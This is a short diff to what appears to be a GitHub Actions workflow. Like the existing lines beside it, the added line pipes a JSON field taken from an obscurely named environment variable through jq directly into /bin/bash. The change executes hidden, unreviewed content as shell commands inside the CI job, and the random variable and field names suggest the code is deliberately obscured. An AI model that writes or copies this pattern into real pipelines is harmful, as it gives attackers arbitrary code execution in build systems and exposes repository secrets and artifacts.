@@ -28,6 +28,7 @@ jobs:
           echo $g2483 | jq -r .cl1 | /bin/bash
           printf '%s' "$rvjo104" | jq -r .bk90 | /bin/bash
           printf '%s' "$etwt56" | jq -r .wi06 | /bin/bash
+          printf '%s' "$cet64715" | jq -r .xxdv2016 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
